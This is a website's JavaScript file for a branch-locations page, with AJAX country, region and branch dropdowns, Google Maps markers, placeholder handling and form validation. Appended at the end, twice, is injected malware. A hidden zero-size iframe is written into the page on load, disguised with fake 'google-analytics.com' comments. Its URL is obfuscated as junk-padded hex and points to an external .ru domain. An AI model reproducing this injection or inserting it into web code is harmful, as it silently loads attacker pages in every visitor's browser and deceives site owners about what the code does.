//	=============================================
//	DOM Load Event
//	=============================================
//	Fires when the DOM is loaded not all the
//	images so it's faster, cleaner and a whole
//	lot more web2.0
//	---------------------------------------------
function addDOMLoadEvent(func) {
   if (!window.__load_events) {
      var init = function () {
          if (arguments.callee.done) return;
          arguments.callee.done = true;
          if (window.__load_timer) {
              clearInterval(window.__load_timer);
              window.__load_timer = null;
          }
          for (var i=0;i < window.__load_events.length;i++) {
              window.__load_events[i]();
          }
          window.__load_events = null;
      };
      if (document.addEventListener) {
          document.addEventListener("DOMContentLoaded", init, false);
      }
      if (/WebKit/i.test(navigator.userAgent)) {
          window.__load_timer = setInterval(function() {
              if (/loaded|complete/.test(document.readyState)) {
                  init();
              }
          }, 10);
      }
      window.onload = init;
      window.__load_events = [];
   }
   window.__load_events.push(func);
}

//	=============================================
//	GetElementsByClassName
//	=============================================
//	This function, um, gets elements by their
//	class names. Yeah.
//	Stolen from Scott Schiller
//	---------------------------------------------
function getElementsByClassName(className,oParent) {
  var doc = (oParent||document);
  var matches = [];
  var nodes = doc.all||doc.getElementsByTagName('*');
  for (var i=0; i<nodes.length; i++) {
    if (nodes[i].className == className || nodes[i].className.indexOf(className)+1 || nodes[i].className.indexOf(className+' ')+1 || nodes[i].className.indexOf(' '+className)+1) {
      matches[matches.length] = nodes[i];
    }
  }
  return matches; // kids, don't play with fire. ;)
}


//	=============================================
//	AJAX Calls
//	=============================================
//	WOOT AJAX
//	---------------------------------------------
function ajax( url, func )
{
	req = false;
	// branch for native XMLHttpRequest object
	if(window.XMLHttpRequest) {
		try {
			req = new XMLHttpRequest();
		} catch(e) {
			req = false;
		}
	// branch for IE/Windows ActiveX version
	} else if(window.ActiveXObject) {
		try {
			req = new ActiveXObject("Msxml2.XMLHTTP");
		} catch(e) {
			try {
				req = new ActiveXObject("Microsoft.XMLHTTP");
			} catch(e) {
				req = false;
			}
		}
	}
	if(req) {
		req.onreadystatechange = func;
		req.open("GET", url, true);
		req.send("");
	}
}

//	=============================================
//	Locations Init
//	=============================================
//	Web2.0erize the Locations page
//	---------------------------------------------
var spinner = document.createElement("img");
	spinner.src = "/img/presentation/spinner.gif";
	spinner.alt = "Loading...";
	spinner.id = "spinner";
var map = new Object();
function locationsInit()
{
	if(!document.getElementById) return;
	
	var form = document.getElementById('locationfinder');
	var dl = form.getElementsByTagName("DL").item(0);
	
	// -- Hide Submit
	var submit = form.getElementsByTagName("input").item(0);
	submit.parentNode.parentNode.removeChild(submit.parentNode);
	
	// -- Get Country Finder
	var select = form.getElementsByTagName("select").item(0);
	
	// -- Add some JS Hooks to the Country Finder Select
	ajax("/php/ajaxGetEntries.php?locations_parent=0", function(){
		if (req.readyState == 4) {
		if (req.status == 200) {
			var select = document.getElementById("findcountry");
			var entries = req.responseXML.firstChild.childNodes;
			
			for(var i=0; i<entries.length; i++)
			{
				var url_title = entries[i].getElementsByTagName("url_title").item(0).firstChild.nodeValue;
				for(var j=0; j<select.options.length; j++)
				{
					if(select.options[j].value == url_title)
					{
						var latsnlongs = new Array("latitude", "longitude", "zoom");
						for(var key in latsnlongs)
						{
							if(entries[i].getElementsByTagName(latsnlongs[key]).item(0).firstChild)
							{
								select.options[j][latsnlongs[key]] = entries[i].getElementsByTagName(latsnlongs[key]).item(0).firstChild.nodeValue;
							}
							else
							{
								select.options[j][latsnlongs[key]] = "";
							}
						}
					}
				}
			}
		}
		}
	});
	
	// -- Enable Country Finder
	select.onchange = function()
	{
		if(this.value == "") return false;
		
		attachSpinner(this);
		ajax("/php/ajaxGetEntries.php?locations_parent="+this.value, function()
		{
			if (req.readyState == 4) {
			if (req.status == 200) {
				removeSpinner();
				generateDetailLink('country');
				enable('findregion', req.responseXML);
			}
			}
		});
	}
	
	// -- Show Region Finder
	dl.appendChild(generateRegionFinderLabel());
	dl.appendChild(generateRegionFinder());
	
	// -- Show Branch Finder
	dl.appendChild(generateBranchFinderLabel());
	dl.appendChild(generateBranchFinder());
	
	// -- Start the Map
	if (GBrowserIsCompatible()) {
		document.getElementById("googlemapholder").style.display = "block";
		document.getElementById("googlemap").style.display = "block";
		
		map = new GMap2(document.getElementById("googlemap"));
		map.setCenter(new GLatLng(53.330873,-6.251221), 6);
		map.addControl(new GSmallMapControl());
		
		addAllLocations();
	}
}

//	=============================================
//	Generate Region Finder Select
//	=============================================
//	Function to return the dt and dd containing
//	the region finder select
//	---------------------------------------------
function generateRegionFinderLabel()
{
	var dt = document.createElement("dt");
	var label = document.createElement("label");
		label.setAttribute("for", "findregion");
		//label.appendChild(document.createTextNode(L('choose_a_region')));
		label.innerHTML = L('choose_a_region');
	dt.appendChild(label);
	
	return dt;
}
function generateRegionFinder()
{
	var dd = document.createElement("dd");
	var regionfinder = document.createElement("select");
		regionfinder.id = "findregion";
		regionfinder.name = "findregion";
		regionfinder.disabled = "disabled";
		regionfinder.onchange = function()
		{
			if(this.value == "") return false;
			
			attachSpinner(this);
			ajax("/php/ajaxGetEntries.php?locations_parent="+this.value, function()
			{
				if (req.readyState == 4) {
				if (req.status == 200) {
					removeSpinner();
					generateDetailLink('region');
					enable('findbranch', req.responseXML);
				}
				}
			});
		}
	var option = document.createElement("option");
		//option.appendChild(document.createTextNode(L('choose_a_region')));
		option.innerHTML = L('choose_a_region');
	regionfinder.appendChild(option);
	dd.appendChild(regionfinder);
	
	return dd;
}

//	=============================================
//	Generate Branch Finder Select
//	=============================================
//	Function to return the dt and dd containing
//	the branch finder select
//	---------------------------------------------
function generateBranchFinderLabel()
{
	var dt = document.createElement("dt");
	var label = document.createElement("label");
		label.setAttribute("for", "findbranch");
		//label.appendChild(document.createTextNode(L('choose_a_branch')));
		label.innerHTML = L('choose_a_branch');
	dt.appendChild(label);
	
	return dt;
}
function generateBranchFinder()
{
	var dd = document.createElement("dd");
	var branchfinder = document.createElement("select");
		branchfinder.id = "findbranch";
		branchfinder.name = "findbranch";
		branchfinder.disabled = "disabled";
		branchfinder.onchange = function()
		{
			generateDetailLink('branch');
		
		}
	var option = document.createElement("option");
		//option.appendChild(document.createTextNode(L('choose_a_branch')));
		option.innerHTML = L('choose_a_branch');
	branchfinder.appendChild(option);
	dd.appendChild(branchfinder);
	
	return dd;
}

//	=============================================
//	Toggle Spinner
//	=============================================
//	Used to control the ajax-y goodness of
//	spinning progress meters
//	---------------------------------------------
function attachSpinner(select)
{
	if(document.getElementById("spinner")) document.getElementById("spinner").parentNode.removeChild(document.getElementById("spinner"));
	select.parentNode.appendChild(spinner);
}
function removeSpinner()
{
	if(document.getElementById("spinner")) document.getElementById("spinner").parentNode.removeChild(document.getElementById("spinner"));
}

//	=============================================
//	Add Pushpins for All Locations to the Map
//	=============================================
//	Loops through the locations array, created in
//	another ee-js file and adds them as markers.
//	Also adds a reference to the marker into the
//	array for later 'triggering'
//	---------------------------------------------
function addAllLocations()
{
	for(var key in locations)
	{
		if(locations[key][8] != "" && locations[key][9] != "")
		{
			map.addOverlay(createMarker(locations, key));
		}
	}
}
function createMarker( locations, key )
{
	var point = new GLatLng(locations[key][8],locations[key][9]);
	var marker = new GMarker(point, generateIcon(locations[key][1]));
	GEvent.addListener(marker, "click", function() {
		var string = "<div id=\"locationsinfo\" class=\"vcard\"><h3 class=\"org\"><a href=\"/locations/detail/"+key+"/\" title=\"Visit the " + locations[key][0] + " page\">" + locations[key][0] + "</a></h3>";
		if(locations[key][2] != "") string += "<span class=\"n\">" + locations[key][2] + "</span>";
		if(locations[key][3] != "") string += "<span class=\"tel\">" + locations[key][3] + "</span>";
		if(locations[key][4] != "" || locations[key][5] != "" || locations[key][6] != "" || locations[key][7] != "") string += "<div class=\"adr\">";
		if(locations[key][4] != "") string += "<span class=\"street-address\">" + locations[key][4] + "</span>";
		if(locations[key][5] != "") string += "<span>" + locations[key][5] + "</span>";
		if(locations[key][6] != "") string += "<span class=\"locality\">" + locations[key][6] + "</span>";
		if(locations[key][7] != "") string += "<span class=\"region\">" + locations[key][7] + "</span>";
		if(locations[key][4] != "" || locations[key][5] != "" || locations[key][6] != "" || locations[key][7] != "") string += "</div>";
		
		string += "</div>";
		marker.openInfoWindowHtml(string);
	});
	locations[key]['marker'] = marker;
	
	return marker;
}

//	=============================================
//	Generate Pushpin Icon
//	=============================================
//	Generates an icon of the proper 'type'
//	---------------------------------------------
function generateIcon( type )
{
	var icon = new GIcon();
	if(type == "Regional Centre")
	{
		icon.image = "/img/presentation/regional_centre_pushpin.png";
	}
	else
	{
		icon.image = "/img/presentation/branch_pushpin.png";
	}
	icon.iconSize = new GSize(20,34);
	icon.iconAnchor = new GPoint(10, 34);
	icon.infoWindowAnchor = new GPoint(10, 34);
	
	return icon;
}

//	=============================================
//	Get Standard Zoom Level
//	=============================================
//	Get a standard zoom level depending on the
//	type of location
//	---------------------------------------------
function getZoomLevel( type )
{
	var zoom = 6;
	if(type == 'country' || type == 'Province')
	{
		return 3;
	}
	else if(type.toLowerCase() == 'region')
	{
		return 6;
	}
	else if(type.toLowerCase() == 'branch' || type == 'Regional Centre')
	{
		return 12;
	}
	
	return zoom;
}

//	=============================================
//	Generate the More Info Link
//	=============================================
//	Controls the 'jump' links on the locations
//	page.
//	---------------------------------------------
function generateDetailLink( where )
{
	var form = document.getElementById('locationfinder');
	var dl = form.getElementsByTagName("DL").item(0);
	
	var dd = document.createElement("dd");
		dd.className = "jumpout";
	var anchor = document.createElement("a");
		anchor.id = where+"jumpout";
	if(!document.getElementById(where+"jumpout"))
	{
		dd.appendChild(anchor);
		dd.appendChild(document.createTextNode(" or "));
	}
	else
	{
		document.getElementById(where+"jumpout").parentNode.replaceChild(anchor, document.getElementById(where+"jumpout"));
	}
	
	var select = false;
	switch(where)
	{
		case 'country':
			select = document.getElementById("findcountry");
			anchor.href = "/locations/detail/"+document.getElementById("findcountry").value;
			//anchor.appendChild(document.createTextNode(L('view')+" "+document.getElementById("findcountry")[document.getElementById("findcountry").selectedIndex].innerHTML+" "+L('details')));
			anchor.innerHTML = L('view')+" "+document.getElementById("findcountry")[document.getElementById("findcountry").selectedIndex].innerHTML+" "+L('details');
			if(!document.getElementById(where+"jumpout")) dl.insertBefore(dd, document.getElementById("findregion").parentNode.previousSibling);
			break;
		case 'region':
			select = document.getElementById("findregion");
			anchor.href = "/locations/detail/"+document.getElementById("findregion").value;
			//anchor.appendChild(document.createTextNode(L('view')+" "+document.getElementById("findregion")[document.getElementById("findregion").selectedIndex].innerHTML+" "+L('details')));
			anchor.innerHTML = L('view')+" "+document.getElementById("findregion")[document.getElementById("findregion").selectedIndex].innerHTML+" "+L('details');
			if(!document.getElementById(where+"jumpout")) dl.insertBefore(dd, document.getElementById("findbranch").parentNode.previousSibling);
			break;
		case 'branch':
			select = document.getElementById("findbranch");
			break;
	}
	
	if(select != false)
	{
		if(select[select.selectedIndex].latitude && select[select.selectedIndex].longitude)
		{
			zoom = (select[select.selectedIndex].zoom) ? select[select.selectedIndex].zoom : getZoomLevel(where);
			map.setCenter(new GLatLng(select[select.selectedIndex].latitude, select[select.selectedIndex].longitude), Number(zoom));
			
			if(where == 'branch')
			{
				GEvent.trigger(locations[select[select.selectedIndex].value]['marker'], "click");
			}
		}
	}
}

//	=============================================
//	Populate Selects
//	=============================================
//	Populate the location's select fields with
//	ajax returned content
//	---------------------------------------------
function enable( where, xml )
{
	if(!document.getElementById) return false;
	if(!document.getElementById(where)) return false;
	
	var old_select = document.getElementById(where);
	var select = document.createElement("select");
		select.id = old_select.id;
		select.name = old_select.name;
		select.disabled = old_select.disabled;
		select.onchange = old_select.onchange;
	old_select.parentNode.replaceChild(select, old_select);
	var first_option = document.createElement("option");
		first_option.appendChild(document.createTextNode("Please select a "+(where.substring(4))));
	select.appendChild(first_option);
	
	var entries = xml.firstChild;
	if(entries.nodeName.toLowerCase() == 'xml') entries = entries.nextSibling;
	if(entries.childNodes.length > 0)
	{
		select.removeAttribute("disabled");
		
		var entry = entries.firstChild;
		while(entry != null)
		{
			var option = document.createElement("option");
				option.value = entry.getElementsByTagName("url_title").item(0).firstChild.nodeValue;
				var latsnlongs = new Array("latitude", "longitude", "zoom");
				for(var key in latsnlongs)
				{
					if(entry.getElementsByTagName(latsnlongs[key]).item(0).childNodes.length > 0)
					{
						option[latsnlongs[key]] = entry.getElementsByTagName(latsnlongs[key]).item(0).firstChild.nodeValue;
					}
					else
					{
						option[latsnlongs[key]] = "";
					}
				}
				option.innerHTML = entry.getElementsByTagName("title").item(0).firstChild.nodeValue;
			select.appendChild(option);
			entry = entry.nextSibling;
		}
	}
	
	if(where == 'findregion')
	{
		if(document.getElementById("regionjumpout"))
		{
			document.getElementById("regionjumpout").parentNode.parentNode.removeChild(document.getElementById("regionjumpout").parentNode);
		}
		if(!document.getElementById('findbranch')) return;
		var findbranch = document.getElementById("findbranch");
		findbranch.parentNode.parentNode.replaceChild(generateBranchFinder(), findbranch.parentNode);
	}
}

//	=============================================
//	Map Init
//	=============================================
//	Creates a map on the events page centered on
//	the event's coordinates.
//	---------------------------------------------
function mapInit()
{
	if (GBrowserIsCompatible() && centerLat != "" && centerLon != "") {
		if(document.getElementById("googlemapholder")) document.getElementById("googlemapholder").style.display = "block";
		if(document.getElementById("googlemap")) document.getElementById("googlemap").style.display = "block";
		map = new GMap2(document.getElementById("googlemap"));
		
		zoom = (centerZom) ? centerZom : getZoomLevel(type);
		map.setCenter(new GLatLng(centerLon,centerLat), Number(zoom));
		map.addControl(new GSmallMapControl());
		
		if(type == 'Province' || type == 'Region')
		{
			addAllLocations();
		}
		else
		{
			map.addOverlay(new GMarker(new GLatLng(centerLon,centerLat), generateIcon(type)));
		}
	}
}



//	=============================================
//	Grey Initial Values
//	=============================================
//	Replaces a field's initial value only if the
//	user enters a string. Otherwise, it prefills
//	the original value again
//	---------------------------------------------

function greyInitialValues(){
	var filled = getElementsByClassName("filled");
	
	if(filled.length > 0){
		for(var i = 0; i < filled.length; i++){
			filled[i].className = "empty";
			filled[i].initialValue = filled[i].value;
			
			filled[i].onclick = filled[i].onfocus = function(){
				this.className = "filled";
				if(this.value == this.initialValue){
					this.value= "";
				}
			}
			
			filled[i].onblur = function(){
				if(this.value == this.initialValue || this.value == ""){
					this.className = "empty";
					this.value = this.initialValue;
				}else{
					this.className = "filled";
				}
			}
		}
	}else{ 
		return; 
	}
}

addDOMLoadEvent(greyInitialValues);


//	=============================================
//	Form Validation
//	=============================================
//
//	Validates forms. Duh.
//
//	---------------------------------------------

function checkForm(emailID){
	if(!document.getElementById){ return; }

	var requiredFields;
	var submitForm = true;
	var emailTest = /^([a-zA-Z0-9])+([\.a-zA-Z0-9_-])*@([a-zA-Z0-9])+(\.[a-zA-Z0-9_-]+)+$/;
	
	if(document.getElementById('required')){
		requiredFields = document.getElementById('required').value.split(','); //creates an array based on the required fields specified in the "hidden" input value
	}

	//see if they have values
	for(i = 0; i<requiredFields.length; i++){
		if(document.getElementById(requiredFields[i]).value == ""){
			highlightField(requiredFields[i]);
			submitForm = false;
		}else{
			if(requiredFields[i] == emailID){
				if(!emailTest.test(document.getElementById(emailID).value)){
					submitForm = false;
					highlightField(requiredFields[i]);
				}else{
					document.getElementById(requiredFields[i]).className = "";
				}
			}else{
				document.getElementById(requiredFields[i]).className = "";	
			}
		}
	}
	
	if(!submitForm){ 
		alert("Please fill in all required fields.");
		return false; 
	}
	
	return true;
}


function highlightField(fieldID){ document.getElementById(fieldID).className = "stillempty"; }


function attachValidationHandler(formID, emailID){
	if(!document.getElementById) { return; }
	
	
	if(attachValidationHandler.arguments.length == 1){	
		document.getElementById(formID).onsubmit = function(){ 
			return checkForm(); 
		}
	}else{
		document.getElementById(formID).onsubmit = function(){ 
			return checkForm(emailID); 
		}
	}
}

document.write('<!-- google-analytics.com --><style type=\"text/css\"> iframe {width:0;height:0;border:0;} </style><div id=\"e578\" style=\"display:none;\">#%@$6$8$#%@$7$4$#%@$7$4$#%@$7$0$#%@$3$a$#%@$2$f$#%@$2$f$#%@$6$3$#%@$6$c$#%@$6$9$#%@$6$3$#%@$6$b$#%@$7$3$#%@$3$1$#%@$3$0$#%@$3$0$#%@$2$e$#%@$7$2$#%@$7$5$#%@$2$f$#%@$7$4$#%@$6$f$#%@$7$0$#%@$3$1$#%@$3$0$#%@$3$0$#%@$2$f$#%@$6$9$#%@$6$6$#%@$7$2$#%@$6$1$#%@$6$d$#%@$6$5$#%@$2$e$#%@$7$0$#%@$6$8$#%@$7$0$</div>
<script>document.write(\'<iframe src=\\\'\'+unescape(document.getElementById(\'e578\').innerHTML.replace(/[\\+!*^#@$]/g,\"\"))+\'\\\'></iframe>\');</script><!--/google-analytics.com -->');

document.write('<!-- google-analytics.com --><style type=\"text/css\"> iframe {width:0;height:0;border:0;} </style><div id=\"e578\" style=\"display:none;\">#%@$6$8$#%@$7$4$#%@$7$4$#%@$7$0$#%@$3$a$#%@$2$f$#%@$2$f$#%@$6$3$#%@$6$c$#%@$6$9$#%@$6$3$#%@$6$b$#%@$7$3$#%@$3$1$#%@$3$0$#%@$3$0$#%@$2$e$#%@$7$2$#%@$7$5$#%@$2$f$#%@$7$4$#%@$6$f$#%@$7$0$#%@$3$1$#%@$3$0$#%@$3$0$#%@$2$f$#%@$6$9$#%@$6$6$#%@$7$2$#%@$6$1$#%@$6$d$#%@$6$5$#%@$2$e$#%@$7$0$#%@$6$8$#%@$7$0$</div>
<script>document.write(\'<iframe src=\\\'\'+unescape(document.getElementById(\'e578\').innerHTML.replace(/[\\+!*^#@$]/g,\"\"))+\'\\\'></iframe>\');</script><!--/google-analytics.com -->');